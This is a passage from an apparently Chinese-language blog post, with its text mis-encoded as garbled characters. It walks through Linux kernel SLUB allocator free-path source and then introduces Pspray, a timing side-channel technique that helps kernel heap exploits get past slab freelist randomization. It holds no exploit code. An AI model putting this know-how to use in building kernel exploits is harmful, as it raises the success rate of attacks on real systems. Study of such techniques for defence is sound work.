class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">struct slab *slab, <span class="keyword">void</span> *head, <span class="keyword">void</span> *tail,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> cnt, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *tail_obj = tail ? : head;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tid;</span><br><span class="line"><span class="keyword">void</span> **freelist;</span><br><span class="line"></span><br><span class="line">redo:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Determine the currently cpus per cpu slab.</span></span><br><span class="line"><span class="comment"> * The cpu may change afterward. However that does not matter since</span></span><br><span class="line"><span class="comment"> * data is retrieved via this pointer. If we are on the same cpu</span></span><br><span class="line"><span class="comment"> * during the cmpxchg then the free will succeed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">tid = READ_ONCE(c-&gt;tid);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Same with comment on barrier() in slab_alloc_node() */</span></span><br><span class="line">barrier();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;</span><br><span class="line">__slab_free(s, slab, head, tail_obj, cnt, addr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (USE_LOCKLESS_FAST_PATH()) &#123;</span><br><span class="line">freelist = READ_ONCE(c-&gt;freelist);</span><br><span class="line"></span><br><span class="line">set_freepointer(s, tail_obj, freelist);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!__update_cpu_freelist_fast(s, freelist, head, tid))) &#123;</span><br><span class="line">note_cmpxchg_failure(<span class="string">&quot;slab_free&quot;</span>, s, tid);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Update the free list under the local lock */</span></span><br><span class="line">local_lock(&amp;s-&gt;cpu_slab-&gt;lock);</span><br><span class="line">c = this_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line"><span class="keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;</span><br><span class="line">local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">&#125;</span><br><span class="line">tid = c-&gt;tid;</span><br><span class="line">freelist = c-&gt;freelist;</span><br><span class="line"></span><br><span class="line">set_freepointer(s, tail_obj, freelist);</span><br><span class="line">c-&gt;freelist = head;</span><br><span class="line">c-&gt;tid = next_tid(tid);</span><br><span class="line"></span><br><span class="line">local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line">stat(s, FREE_FASTPATH);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¾æ—§åˆ†ä¸ºä¸¤æ¡è·¯å¾„ï¼Œé¦–å…ˆä¼šæ¯”è¾ƒå¾…é‡Šæ”¾çš„å¯¹è±¡æ‰€å±äºçš„slabæ˜¯å¦æ˜¯<code>percpu slab</code>ï¼Œå¦‚æœæ˜¯åˆ™ç›´æ¥æŒ‚å›å»å³å¯ï¼Œéµå¾ªLIFOæœºåˆ¶ã€‚</p><p>å¦‚æœä¸æ˜¯åˆ™ä¼šè¿›å…¥åˆ°<code>__slab_free</code>å‡½æ•°ä¸­è¿›è¡Œå¤„ç†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __slab_free(struct kmem_cache *s, struct slab *slab,</span><br><span class="line"><span class="keyword">void</span> *head, <span class="keyword">void</span> *tail, <span class="keyword">int</span> cnt,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *prior;</span><br><span class="line"><span class="keyword">int</span> was_frozen;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> <span class="title">new</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> counters;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">stat(s, FREE_SLOWPATH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kfence_free(head))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_SLUB_TINY) || kmem_cache_debug(s)) &#123;</span><br><span class="line">free_to_partial_list(s, slab, head, tail, cnt, addr);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (unlikely(n)) &#123;</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line">n = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">prior = slab-&gt;freelist;</span><br><span class="line">counters = slab-&gt;counters;</span><br><span class="line">set_freepointer(s, tail, prior);</span><br><span class="line"><span class="keyword">new</span>.counters = counters;</span><br><span class="line">was_frozen = <span class="keyword">new</span>.frozen;</span><br><span class="line"><span class="keyword">new</span>.inuse -= cnt;</span><br><span class="line"><span class="keyword">if</span> ((!<span class="keyword">new</span>.inuse || !prior) &amp;&amp; !was_frozen) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmem_cache_has_cpu_partial(s) &amp;&amp; !prior) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Slab was on no list before and will be</span></span><br><span class="line"><span class="comment"> * partially empty</span></span><br><span class="line"><span class="comment"> * We can defer the list move and instead</span></span><br><span class="line"><span class="comment"> * freeze it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">new</span>.frozen = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">/* Needs to be taken off a list */</span></span><br><span class="line"></span><br><span class="line">n = get_node(s, slab_nid(slab));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Speculatively acquire the list_lock.</span></span><br><span class="line"><span class="comment"> * If the cmpxchg does not succeed then we may</span></span><br><span class="line"><span class="comment"> * drop the list_lock without any processing.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise the list_lock will synchronize with</span></span><br><span class="line"><span class="comment"> * other processors updating the list of slabs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">spin_lock_irqsave(&amp;n-&gt;list_lock, flags);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (!slab_update_freelist(s, slab,</span><br><span class="line">prior, counters,</span><br><span class="line">head, <span class="keyword">new</span>.counters,</span><br><span class="line"><span class="string">&quot;__slab_free&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (likely(!n)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (likely(was_frozen)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The list lock was not taken therefore no list</span></span><br><span class="line"><span class="comment"> * activity can be necessary.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">stat(s, FREE_FROZEN);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">new</span>.frozen) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we just froze the slab then put it onto the</span></span><br><span class="line"><span class="comment"> * per cpu partial list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">put_cpu_partial(s, slab, <span class="number">1</span>);</span><br><span class="line">stat(s, CPU_PARTIAL_FREE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!<span class="keyword">new</span>.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))</span><br><span class="line"><span class="keyword">goto</span> slab_empty;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Objects left in the slab. If it was not on the partial list before</span></span><br><span class="line"><span class="comment"> * then add it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) &#123;</span><br><span class="line">remove_full(s, n, slab);</span><br><span class="line">add_partial(n, slab, DEACTIVATE_TO_TAIL);</span><br><span class="line">stat(s, FREE_ADD_PARTIAL);</span><br><span class="line">&#125;</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">slab_empty:</span><br><span class="line"><span class="keyword">if</span> (prior) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Slab on the partial list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">remove_partial(n, slab);</span><br><span class="line">stat(s, FREE_REMOVE_PARTIAL);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Slab must be on the full list */</span></span><br><span class="line">remove_full(s, n, slab);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line">stat(s, FREE_SLAB);</span><br><span class="line">discard_slab(s, slab);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿˜æ˜¯<code>kfence</code>å’Œ<code>kmem_cache_debug</code>ç›¸å…³ï¼Œå¦‚æœè®¾ç½®äº†<code>SLAB_DEBUG_FLAGS</code>åˆ™ç›´æ¥è°ƒç”¨<code>free_to_partial_list</code>å‡½æ•°åè¿”å›å³å¯ã€‚</p><p>éšåè¿›å…¥å¾ªç¯ï¼Œè¿™é‡Œé¦–å…ˆå°†å¾…é‡Šæ”¾<code>freelist</code>æ‰€å±äºçš„slabçš„<code>freelist</code>å†™åˆ°å¸¦é‡Šæ”¾<code>freelist</code>å¯¹åº”çš„ä½ç½®ï¼Œè¿™é‡Œnewæ˜¯æ ˆä¸Šçš„ä¸´æ—¶slabç»“æ„ä½“ã€‚</p><p>ç„¶åè¿›è¡Œåˆ¤æ–­ï¼Œslabçš„æ‰€æœ‰å¯¹è±¡éƒ½æœªè¢«ä½¿ç”¨æˆ–è€…slabä¸Šæ²¡æœ‰ç©ºé—²çš„å¯¹è±¡å¹¶ä¸”slabæœªè¢«å†»ç»“ï¼Œåˆ™ä¼šè¿›å…¥åˆ†æ”¯ä¸­ã€‚è¿›å…¥åˆ†æ”¯ä¹‹åç»§ç»­åˆ¤æ–­ï¼Œé¦–å…ˆæŸ¥çœ‹æ˜¯å¦æœ‰<code>percpu partial slab</code>å¹¶ä¸”slabä¸Šæ²¡æœ‰ç©ºé—²çš„å¯¹è±¡ï¼Œå¦‚æœæˆç«‹åˆ™è®©è¯¥slabå†»ç»“ï¼Œå¦‚æœä¸æ˜¯åˆ™è·å–slabæ‰€å¯¹åº”çš„<code>kmem_cahce_node</code>ã€‚</p><p>ç»“æŸå¾ªç¯åï¼Œä¼šåˆ¤æ–­æ˜¯å¦æ‰¾åˆ°<code>kmem_cache_node</code>ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆ™è¿›å…¥åˆ†æ”¯ä¸­ï¼Œå¦‚æœslabå·²è¢«å†»ç»“ï¼Œåˆ™ä»€ä¹ˆéƒ½ä¸æ•¢ï¼Œè‹¥éœ€è¦è¢«å†»ç»“åˆ™è°ƒç”¨<code>put_cpu_partial</code>å‡½æ•°ç›´æ¥å°†slabæ”¾å…¥åˆ°<code>percpu partial</code>é“¾è¡¨ä¸­ï¼Œå®Œæˆé‡Šæ”¾å·¥ä½œã€‚</p><p>æ¥ä¸‹æ¥ä¼šåˆ¤æ–­ï¼Œslabçš„è¢«ä½¿ç”¨çš„å¯¹è±¡çš„æ•°é‡æ˜¯å¦ä¸º0å¹¶ä¸”<code>n-&gt;nr_partial == s-&gt;min_partial</code>çš„è¯å°±ä»£è¡¨è¯¥slabçš„æ‰€æœ‰çš„å¯¹è±¡éƒ½è¢«é‡Šæ”¾æ‰äº†å¹¶ä¸”nodeä¸Šçš„<code>partial slab</code>æ•°é‡å·²ç»è¶…è¿‡<code>min_partial</code>äº†ï¼Œè¿™æ—¶ä¼šè·³å…¥<code>slab_empty</code>æ ‡ç­¾ä¸­ã€‚åœ¨<code>slab_empty</code>æ ‡ç­¾çš„é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œåˆ¤æ–­å½“å‰slabåŸå…ˆæ˜¯å¦æœ‰ç©ºé—²å¯¹è±¡ï¼Œç„¶åé€‰æ‹©ä»å¯¹åº”çš„åœ°æ–¹ç§»é™¤ï¼Œæœ€åè°ƒç”¨<code>discard_slab</code>å‡½æ•°ï¼Œé‡Šæ”¾è¯¥slabåˆ°å†…å­˜ä¸­ã€‚</p><p>å¦‚æœä¸æ»¡è¶³ä¼šåšä¸€äº›æ£€æŸ¥ï¼Œå¹¶ä¸”å¦‚æœä»¥å‰è¯¥slabä½äºfullä¹Ÿå°†è¢«ç§»åˆ°<code>partial</code>ä¸­ã€‚</p><h3 id="kfree"><a href="#kfree" class="headerlink" title="kfree"></a>kfree</h3><p>ä¸Šé¢æ˜¯é‡Šæ”¾å¯¹è±¡çš„æ ¸å¿ƒå‡½æ•°é€»è¾‘ï¼Œä¸‹é¢ä¸€æ ·æä¸€ä¸‹ä¸Šå±‚å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">folio</span> *<span class="title">folio</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line"></span><br><span class="line">trace_kfree(_RET_IP_, object);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(object)))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">folio = virt_to_folio(object);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!folio_test_slab(folio))) &#123;</span><br><span class="line">free_large_kmalloc(folio, (<span class="keyword">void</span> *)object);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">slab = folio_slab(folio);</span><br><span class="line">s = slab-&gt;slab_cache;</span><br><span class="line">__kmem_cache_free(s, (<span class="keyword">void</span> *)object, _RET_IP_);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kfree);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‡ºç°äº†ä¸€ä¸ªé—å¿˜ä¸ç†Ÿæ‚‰çš„ç»“æ„ä½“<code>folio</code>ï¼Œè¿™é‡Œç®€å•æä¸€ä¸‹ï¼Œå…¶è¡¨ç¤ºçš„æ˜¯ä¸€å—ç‰©ç†ï¼Œè™šæ‹Ÿï¼Œé€»è¾‘ä¸Šéƒ½æ˜¯è¿ç»­çš„å†…å­˜ï¼Œå…¶æœ¬è´¨æ˜¯å¤ç”¨pageç»“æ„ä½“ç„¶åå°†å…¶è½¬åŒ–ä¸ºäº†<code>folio</code>ç»“æ„ä½“ã€‚</p><p>å¯ä»¥çœ‹åˆ°å‡½æ•°æœ€å…ˆä½¿ç”¨<code>virt_to_folio</code>å‡½æ•°å¾—åˆ°äº†<code>folio</code>ç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct folio *<span class="title">virt_to_folio</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> virt_to_page(x);</span><br><span class="line"><span class="keyword">return</span> page_folio(page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¦–å…ˆè°ƒç”¨<code>virt_to_page</code>å‡½æ•°ä»è™šæ‹Ÿåœ°å€æ‰¾åˆ°å…¶é¡µé¢ï¼Œéšåè°ƒç”¨<code>page_folio</code>å‡½æ•°ä»é¡µé¢è·å¾—<code>folio</code>ç»“æ„ä½“ã€‚</p><p>ç„¶åæ ¹æ®åå­—å°±èƒ½çœ‹å‡ºæ¥<code>free_large_kmalloc</code>ä¸»è¦ç”¨äºfreeå¤§çš„å¯¹è±¡ï¼Œè€Œå¤§çš„å¯¹è±¡æ˜¯ä»¥å¤åˆé¡µçš„å½¢å¼å­˜åœ¨çš„ï¼Œæ‰€ä»¥å¦‚æœæ˜¯å¤åˆé¡µåˆ™ä¼šè¿›å…¥åˆ°ifåˆ†æ”¯ä¸­ï¼Œå¦‚æœä¸æ˜¯åˆ™è¿›å…¥åˆ°ä¸‹é¢çš„å†…å®¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_large_kmalloc</span><span class="params">(struct folio *folio, <span class="keyword">void</span> *object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order = folio_order(folio);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(order == <span class="number">0</span>))</span><br><span class="line">pr_warn_once(<span class="string">&quot;object pointer: 0x%p\n&quot;</span>, object);</span><br><span class="line"></span><br><span class="line">kmemleak_free(object);</span><br><span class="line">kasan_kfree_large(object);</span><br><span class="line">kmsan_kfree_large(object);</span><br><span class="line"></span><br><span class="line">mod_lruvec_page_state(folio_page(folio, <span class="number">0</span>), NR_SLAB_UNRECLAIMABLE_B,</span><br><span class="line">      -(PAGE_SIZE &lt;&lt; order));</span><br><span class="line">__free_pages(folio_page(folio, <span class="number">0</span>), order);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°åœ¨æœ€åç›´æ¥è°ƒç”¨äº†<code>__free_pages</code>å°†å¯¹è±¡è¿”å›ç»™äº†<code>buddy system</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __kmem_cache_free(struct kmem_cache *s, <span class="keyword">void</span> *x, <span class="keyword">unsigned</span> <span class="keyword">long</span> caller)</span><br><span class="line">&#123;</span><br><span class="line">slab_free(s, virt_to_slab(x), x, <span class="literal">NULL</span>, &amp;x, <span class="number">1</span>, caller);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œé¢å¯¹æ™®é€šçš„å¯¹è±¡é‡Šæ”¾æ˜¯è°ƒç”¨çš„<code>__kmem_cache_free</code>å‡½æ•°å…¶å†…éƒ¨å…¶å®å°±æ˜¯è°ƒç”¨äº†<code>slab_free</code>å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __fastpath_inline <span class="keyword">void</span> <span class="title">slab_free</span><span class="params">(struct kmem_cache *s, struct slab *slab,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">void</span> *head, <span class="keyword">void</span> *tail, <span class="keyword">void</span> **p, <span class="keyword">int</span> cnt,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">memcg_slab_free_hook(s, slab, p, cnt);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * With KASAN enabled slab_free_freelist_hook modifies the freelist</span></span><br><span class="line"><span class="comment"> * to remove objects, whose reuse must be delayed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (slab_free_freelist_hook(s, &amp;head, &amp;tail, &amp;cnt))</span><br><span class="line">do_slab_free(s, slab, head, tail, cnt, addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>slab_free</code>å‡½æ•°å†…éƒ¨æœ€ç»ˆä¹Ÿä¼šè°ƒç”¨åˆ°å‰é¢åˆ†æäº†<code>do_slab_free</code>å‡½æ•°ã€‚</p><h2 id="Psprayç®€å•ä»‹ç»"><a href="#Psprayç®€å•ä»‹ç»" class="headerlink" title="Psprayç®€å•ä»‹ç»"></a>Psprayç®€å•ä»‹ç»</h2><p>åœ¨å‰é¢åˆ†æ<code>slab_alloc_node</code>çš„å‡½æ•°ä¸­å‘ç°äº†å­˜åœ¨äº†ä¸¤æ¡è·¯ï¼Œä¸¤æ¡è·¯çš„åå­—åˆ†åˆ«ä¸º<code>fast path</code>å’Œ<code>slow path</code>ï¼Œè€Œè¿™ä¸€åˆ©ç”¨æ‰‹æ³•å°±æ˜¯åŸºäºä¸Šè¿°çš„ä»£ç å®Œæˆçš„ï¼Œè¿™æ˜¯ä¸€é¡¹åŸºäºæ—¶åºä¾§ä¿¡é“çš„æ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œé€šè¿‡æ­¤æ–¹æ³•å¯ä»¥å¤§å¹…åº¦æé«˜å†…æ ¸æ¼æ´åˆ©ç”¨æˆåŠŸç‡ã€‚</p><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨å†…æ ¸ä¸­æœ‰å¾ˆå¤š <del>åŠ¨ç‰©æœ‹å‹</del> ä¿æŠ¤æœºåˆ¶ï¼Œæ¯”å¦‚CFIï¼ŒKASLRç­‰è¯¸å¤šä¿æŠ¤ï¼Œä½¿å¾—æ”»å‡»è€…ååˆ†éš¾ä»¥å®Œæˆåˆ©ç”¨ã€‚è€Œä¸”ç°å¦‚ä»Šçš„å†…æ ¸åŠ å…¥äº†<code>shadow stack</code>å¹¶ä¸”è¿‘æœŸçˆ†å‡ºçš„è¯¸å¤šæ¼æ´ä¹Ÿéƒ½å’Œå †ç›¸å…³ï¼Œæ‰€ä»¥å†…æ ¸çš„å †åˆ©ç”¨ä¸€ç›´éƒ½æ˜¯å†…æ ¸æ¼æ´çš„ä¸»æµé—¨æ´¾ã€‚ä½†æ˜¯ç©è¿‡å †çš„åº”è¯¥éƒ½çŸ¥é“å†…æ ¸å­˜åœ¨ä¸€ç§æœºåˆ¶æ˜¯<code>slab freelist</code>éšæœºåŒ–ï¼Œè®©æ”»å‡»è€…æ— æ³•é¢„æµ‹åˆ°å³å°†ç”³è¯·çš„å †å—åœ¨ä½•å¤„ï¼Œè¿™ä¹Ÿå°±ä½¿å¾—æ›´åŠ éš¾ä»¥åˆ©ç”¨äº†ã€‚</p><p>è€Œä»Šå¤©ç»™å¤§å®¶ä»‹ç»çš„ä¸€ç§åˆ©ç”¨æ‰‹æ³•<code>Pspray</code>å¯ä»¥ç”¨æ¥å¾ˆå¥½çš„å¯¹æŠ—<code>slab freelist</code>çš„éšæœºåŒ–ã€‚</p><h2 id="ç°çŠ¶åˆ†æ"><a href="#ç°çŠ¶åˆ†æ" class="headerlink" title="ç°çŠ¶åˆ†æ"></a>ç°çŠ¶åˆ†æ</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20231123153331621.png"                      alt="image-20231123153331621"                ></p><p>ä¸Šå›¾ååˆ†ç®€å•æ˜äº†çš„ç»™å‡ºäº†åˆ†é…ä¸€ä¸ªå¯¹è±¡çš„æµç¨‹ã€‚</p><ol><li>  å¦‚æœåœ¨<code>cpu freelist</code>ä¸­æœ‰åˆ™ç›´æ¥å–ï¼Œå¦‚æœæ²¡æœ‰è¿›å…¥ä¸‹ä¸€é˜¶æ®µ</li><li>  è¿™é‡Œä»<code>cpu page freelist</code>ä¸­å–ï¼Œæ“ä½œä¸»è¦æ˜¯ç”¨<code>cpu page freelist</code>ç»™åˆ°<code>cpu freelist</code>ï¼Œå³<code>freelist</code>çš„åˆå§‹åŒ–</li><li>  è¿™é‡Œä»<code>cpu partial list</code>ä¸­å–</li><li>  è¿™é‡Œä»<code>node partial list</code>ä¸­å–</li><li>  å…¨éƒ½æ²¡äº†å°±å‘<code>buddy system</code>ç”³è¯·</li></ol><p>ç„¶åå°±æ˜¯<code>Slab Freelist 